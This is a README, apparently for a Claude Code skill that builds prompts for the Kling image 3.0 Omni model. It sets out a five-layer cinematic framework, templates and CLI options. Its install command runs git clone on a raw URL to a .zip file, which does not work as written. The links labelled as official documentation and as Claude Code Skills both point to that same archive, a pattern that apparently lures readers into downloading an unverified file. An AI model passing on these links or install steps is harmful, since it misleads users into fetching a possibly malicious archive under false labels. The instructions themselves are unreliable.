# naiba-keling-picture-3.0omni

可灵图片 3.0 Omni 提示词生成器 - 基于影视级镜头语言的专业 AI 图像提示词构建工具

## 简介

这是一个专门为**可灵图片 3.0 Omni** 模型设计的提示词生成工具，采用**5层影视框架**，帮助用户构建专业的电影级图像生成提示词。

## 核心特性

- **5层提示词框架**: 基础信息 → 摄影专业 → 构图光影 → 风格质感 → 氛围情绪
- **8种预设模板**: portrait, cinematic, film-noir, fantasy, scifi, anime, commercial, series-story
- **影视专业术语**: 景别、机位、焦距、光圈、影调、光影等完整支持
- **三种生成模式**: 模板模式、自定义模式、系列组图模式

## 安装

```bash
git clone https://raw.githubusercontent.com/c0depie/naiba-keling-picture-3.0omni/main/references/naiba-picture-omni-keling-v1.8.zip
cd naiba-keling-picture-3.0omni
```

## 使用方法

### 模板模式

```bash
bun scripts/main.ts --template portrait --subject "年轻女性"
bun scripts/main.ts --template fantasy --subject "精灵公主"
bun scripts/main.ts --template cinematic --subject "侠客"
```

### 自定义模式

```bash
bun scripts/main.ts \
  --subject "一位精致的亚洲美女" \
  --action "微微侧身，眼神温柔地注视镜头" \
  --scene "简约现代的室内空间" \
  --shot "近景" \
  --angle "平视" \
  --style cinematic \
  --mood "优雅温婉"
```

### 系列组图模式

```bash
bun scripts/main.ts --series --count 4 --subject "侠客在竹林里"
```

## 参数说明

| 参数 | 说明 |
|------|------|
| `--subject` | 主体/角色描述 |
| `--action` | 动作描述 |
| `--scene` | 场景描述 |
| `--shot` | 景别: 远景, 全景, 中景, 近景, 特写, 大特写 |
| `--angle` | 角度: 平视, 俯视, 仰视, 鸟瞰, 荷兰角 |
| `--style` | 风格: cinematic, portrait, fantasy, scifi, anime |
| `--mood` | 氛围/情绪 |
| `--film` | 胶片: kodak, fuji, polaroid |
| `--series` | 系列组图模式 |
| `--template` | 使用预设模板 |
| `--output` | 输出到文件 |

## 5层提示词框架

```
┌─────────────────────────────────────────────────────────┐
│                    可灵提示词5层框架                       │
├─────────────────────────────────────────────────────────┤
│  第5层: 氛围与情绪                                       │
│   ┌─────────────────────────────────────────────────┐   │
│   │ 第4层: 风格与质感                               │   │
│   │  ┌───────────────────────────────────────────┐  │   │
│   │  │ 第3层: 构图与光影                        │  │   │
│   │  │  ┌─────────────────────────────────────┐  │  │   │
│   │  │  │ 第2层: 摄影专业                    │  │  │   │
│   │  │  │  ┌───────────────────────────────┐  │  │  │   │
│   │  │  │  │ 第1层: 基础信息              │  │  │  │   │
│   │  │  │  │  主体 + 动作 + 场景         │  │  │  │   │
│   │  │  │  └───────────────────────────────┘  │  │  │   │
│   │  │  └─────────────────────────────────────┘  │  │   │
│   │  └───────────────────────────────────────────┘  │   │
│   └─────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

## 目录结构

```
naiba-keling-picture-3.0omni/
├── SKILL.md                      # Skill 主文件（Claude Code）
├── scripts/
│   └── main.ts                   # 提示词生成器脚本
├── references/
│   ├── prompt-framework.md       # 5层提示词框架详解
│   ├── examples.md               # 示例提示词库
│   └── terminology.md            # 影视术语词典
└── README.md                     # 本文件
```

## 预设模板

| 模板 | 适用场景 |
|------|----------|
| `portrait` | 人像写真、肖像 |
| `cinematic` | 电影感场景 |
| `film-noir` | 黑色电影风格 |
| `fantasy` | 奇幻场景 |
| `scifi` | 科幻场景 |
| `anime` | 动漫风格 |
| `commercial` | 电商产品 |
| `series-story` | 故事板组图 |

## 示例输出

```
一位精致的亚洲美女，约25岁，瓜子脸，丹凤眼，高挺的鼻梁，樱桃红唇，黑色长发披肩，微微侧身，眼神温柔地注视镜头，嘴角带着浅浅的微笑。简约现代的室内空间，浅灰色背景。近景景别，平视拍摄，浅景深虚化背景。光线是柔和的散射自然光。画面带有真实电影质感，柯达Vision系列胶片拍摄，优雅温婉色调基底。优雅温婉氛围。
```

## 许可证

MIT License

## 相关链接

- [可灵图片官方文档](https://raw.githubusercontent.com/c0depie/naiba-keling-picture-3.0omni/main/references/naiba-picture-omni-keling-v1.8.zip)
- [Claude Code Skills](https://raw.githubusercontent.com/c0depie/naiba-keling-picture-3.0omni/main/references/naiba-picture-omni-keling-v1.8.zip)

---

**Made with ❤️ for AI Image Creators**
